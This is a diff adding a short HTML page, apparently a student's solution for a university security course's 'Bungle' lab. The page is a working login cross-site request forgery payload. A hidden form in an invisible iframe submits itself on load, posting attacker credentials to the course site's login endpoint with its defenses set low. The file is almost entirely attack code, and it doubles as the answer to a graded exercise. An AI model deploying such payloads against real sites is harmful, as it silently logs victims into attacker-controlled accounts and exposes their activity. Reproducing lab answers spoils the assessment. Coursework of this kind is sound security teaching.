@@ -1,0 +1,17 @@
+<html>
+    <head>
+        <title>Bungle!</title>
+    </head>
+    <body>
+        <form name="redirect" method="post" action="https://ecen5032.org/project2/login" target="dummyframe">
+            <input name="csrfdefense" value="0" type="hidden">
+            <input name="xssdefense" value="4" type="hidden">
+            <input name="username" value="attacker" type="hidden">
+            <input name="password" value="l33th4x" type="hidden">
+        </form>
+        <iframe width="0" height="0" border="0" style="display: none;" name="dummyframe" id="dummyframe"></iframe>
+        <script>
+            document.redirect.submit();
+        </script>
+    </body>
+</html>
